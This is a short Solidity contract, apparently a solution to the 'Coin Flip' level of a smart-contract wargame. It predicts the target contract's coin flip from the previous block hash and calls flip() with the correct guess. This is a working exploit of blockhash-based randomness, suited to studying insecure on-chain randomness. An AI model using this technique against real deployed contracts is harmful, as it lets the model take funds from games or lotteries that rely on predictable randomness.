pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import '../3-coin-flip/CoinFlip.sol';

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address target) public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlip cf = CoinFlip(target);
        cf.flip(side);
    }
}
